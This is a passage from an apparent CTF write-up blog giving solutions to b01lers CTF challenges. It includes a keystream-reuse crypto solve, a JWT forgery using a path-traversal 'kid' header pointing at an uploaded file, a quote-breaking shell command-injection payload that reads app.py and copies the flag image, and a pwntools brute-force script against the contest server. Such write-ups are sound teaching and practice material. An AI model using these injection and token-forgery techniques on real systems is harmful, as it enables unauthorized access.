<span class="line"><span style="color:var(--astro-code-token-keyword)">for</span><span style="color:var(--astro-code-color-text)"> i </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> range</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">2</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">257</span><span style="color:var(--astro-code-token-punctuation)">):</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">    # print("Step", i)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">recvuntil</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"Give me something to encrypt: "</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">    # r.sendline(b"0" * len(ciphertext))</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    keystream </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">recvline</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">strip</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-color-text)"> i </span><span style="color:var(--astro-code-token-keyword)">==</span><span style="color:var(--astro-code-token-constant)"> 256</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">        print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">long_to_bytes</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">bytes_to_long</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">bytes</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">fromhex</span><span style="color:var(--astro-code-token-punctuation)">(ciphertext)) </span><span style="color:var(--astro-code-token-keyword)">^</span><span style="color:var(--astro-code-token-function)"> bytes_to_long</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">bytes</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">fromhex</span><span style="color:var(--astro-code-token-punctuation)">(keystream.</span><span style="color:var(--astro-code-token-function)">decode</span><span style="color:var(--astro-code-token-punctuation)">()))).</span><span style="color:var(--astro-code-token-function)">decode</span><span style="color:var(--astro-code-token-punctuation)">())</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)"># bctf{there_is_a_reason_for_random_nonce_and_with_fixed_length_8c6bf5a1398d1f1d95f1}</span></span>
<span class="line"></span></code></pre>
<h2 id="cryptofetus-rsa">crypto/Fetus-RSA</h2>
<!-- TODO -->
<h2 id="webimagehost">web/imagehost</h2>
<ol>
<li>Generate RS256 public key as <code>public.pem</code> and private key as <code>private.pem</code>.</li>
<li>Save <a href="https://evanhahn.com/worlds-smallest-png/">https://evanhahn.com/worlds-smallest-png/</a> as <code>small.png</code>.</li>
<li>Join <code>small.png</code> and <code>public.pem</code> with a line break to form <code>upload.png</code>.</li>
<li>Upload <code>upload.png</code>.</li>
<li>Using <a href="https://jwt.io/">https://jwt.io/</a>, sign the JWT with <code>kid</code> equal to <code>../uploads/&#x3C;uuid>.png</code> and <code>admin</code> equal to <code>true</code>.</li>
<li>Download the flag image. The flag is <code>bctf{should've_used_imgur}</code>.</li>
</ol>
<p><img  src="/blog/_astro/jwt.DU_uusdp_Z6Mxj1.webp" alt="jwt.io" width="2104" height="1516" loading="lazy" decoding="async"></p>
<h2 id="web3-city-elves-writeups">web/3-city-elves-writeups</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span>";A=a;B=b;C=c;E=e;S=s;T=3;c${A}t app.py|he${A}d -c 176|t${A}il -c1>SLASH;re${A}d SEP&#x3C;SLASH;${C}p ${SEP}flag.png as${S}ets${SEP}flag.png;${E}cho "</span></span>
<span class="line"><span></span></span></code></pre>
<p>The flag is <code>bctf{Lucky_you_I_did_not_code_this_stuff_in_Ruby_lasudkjklhdsfkhjkae}</code>.</p>
<h2 id="misccppjail">misc/cppjail</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> pwn </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-token-keyword)"> *</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">N </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 53</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">solution </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> [</span><span style="color:var(--astro-code-token-string-expression)">'b'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'c'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 't'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'f'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '{'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'Y'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '0'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'U'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '_'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '4'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'r'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'E'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '_'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'f'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'U'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'l'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'l'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '_'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'o'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'f'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '_'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'b'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'u'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '1'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '1'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> None</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> None</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> None</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> None</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '_'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'C'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '+'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '+'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '_'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '1'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 's'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '_'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '@'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '_'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'h'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '0'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'r'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'r'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'i'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '8'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'l'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'e'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '_'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'l'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'a'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'n'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'g'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '}'</span><span style="color:var(--astro-code-color-text)">]</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">for</span><span style="color:var(--astro-code-color-text)"> i </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-color-text)"> solution</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-color-text)"> i </span><span style="color:var(--astro-code-token-keyword)">is</span><span style="color:var(--astro-code-token-keyword)"> not</span><span style="color:var(--astro-code-token-constant)"> None</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">        print</span><span style="color:var(--astro-code-token-punctuation)">(i, end</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">""</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    else</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">        print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"*"</span><span style="color:var(--astro-code-token-punctuation)">, end</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">""</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> sys</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">sys</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">exit</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">for</span><span style="color:var(--astro-code-color-text)"> i </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> range</span><span style="color:var(--astro-code-token-punctuation)">(N):</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-color-text)"> solution</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-color-text)">i</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-token-keyword)"> is</span><span style="color:var(--astro-code-token-keyword)"> not</span><span style="color:var(--astro-code-token-constant)"> None</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        continue</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    for</span><span style="color:var(--astro-code-color-text)"> c </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> range</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">32</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">127</span><span style="color:var(--astro-code-token-punctuation)">):</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        o </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> chr</span><span style="color:var(--astro-code-token-punctuation)">(c)</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">        # r = process(["python3", "compile.py"])</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">        print</span><span style="color:var(--astro-code-token-punctuation)">(i, </span><span style="color:var(--astro-code-token-function)">chr</span><span style="color:var(--astro-code-token-punctuation)">(c))</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        r </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> remote</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"gold.b01le.rs"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">7003</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">sendlineafter</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"Input your code: "</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-keyword)">f</span><span style="color:var(--astro-code-token-string-expression)">"Jail&#x3C;bool>::lock&#x3C;'</span><span style="color:var(--astro-code-token-constant)">{</span><span style="color:var(--astro-code-token-punctuation)">o</span><span style="color:var(--astro-code-token-constant)">}</span><span style="color:var(--astro-code-token-string-expression)">',</span><span style="color:var(--astro-code-token-constant)">{</span><span style="color:var(--astro-code-token-punctuation)">i</span><span style="color:var(--astro-code-token-constant)">}</span><span style="color:var(--astro-code-token-string-expression)">>j;static_assert(sizeof(decltype(j))==4);"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        line </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">recvline</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">        print</span><span style="color:var(--astro-code-token-punctuation)">(line)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">close</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        if</span><span style="color:var(--astro-code-token-keyword)"> b</span><span style="color:var(--astro-code-token-string-expression)">"Prisoner 2"</span><span style="color:var(--astro-code-token-keyword)"> in</span><span style="color:var(--astro-code-color-text)"> line</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            solution</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-color-text)">i</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-token-keyword)"> =</span><span style="color:var(--astro-code-token-function)"> chr</span><span style="color:var(--astro-code-token-punctuation)">(c)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">            print</span><span style="color:var(--astro-code-token-punctuation)">(solution)</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">            break</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(solution)</span></span>
<span class="line"></span></code></pre>
<p>and fill the unknown characters with <code>*</code>. The flag is <code>bctf{Y0U_4rE_fUll_of_bu11****_C++_1s_@_h0rri8le_lang}</code>.</p>
<h2 id="pwneasy-note">pwn/easy-note</h2>
<!-- TODO -->
<h2 id="revcatch-me-if-you-can">rev/catch-me-if-you-can</h2>
<p>Read the Python bytecode file using <code>dis.dis</code>, comparing the disassembled code with that of a simple try-catch-finally loop. Optimize the calculation using matrix multiplication and fishy optimizations.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> os</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">sys</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">setrecursionlimit</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">2000000</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">var5 </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> os</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">urandom</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">8</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">var6 </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"You're Lucky"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"Here is your flag: "</span><span style="color:var(--astro-code-token-punctuation)">, end</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">""</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">var12 </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> [</span><span style="color:var(--astro-code-token-constant)">96</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 98</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 68</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 160</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 172</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 115</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 20</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 108</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 25</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 122</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 208</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 71</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 158</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 63</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 233</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 59</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 180</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 165</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 115</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 203</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 177</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 17</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 166</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 196</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 255</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 127</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 70</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 172</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 55</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 11</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 204</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 20</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 198</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 31</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 60</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 167</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 17</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 132</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 106</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 195</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 19</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 38</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 151</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 203</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 163</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 211</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 27</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 73</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 98</span><span style="color:var(--astro-code-color-text)">]</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> numpy </span><span style="color:var(--astro-code-token-keyword)">as</span><span style="color:var(--astro-code-color-text)"> np</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">MOD </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 1000000007</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">MF </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([[</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">for</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> range</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">15</span><span style="color:var(--astro-code-token-punctuation)">):</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 3</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-token-keyword)"> and</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 5</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        M </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">array</span><span style="color:var(--astro-code-token-punctuation)">([[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">], [</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        MF </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> np</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">dot</span><span style="color:var(--astro-code-token-punctuation)">(M, MF)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-color-text)"> MOD</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    elif</span><span style="color:var(--astro-code-color-text)"> var16 </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> 3</span><span style="color:var(--astro-code-token-keyword)"> ==</span><span style="color:var(--astro-code-token-constant)"> 0</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
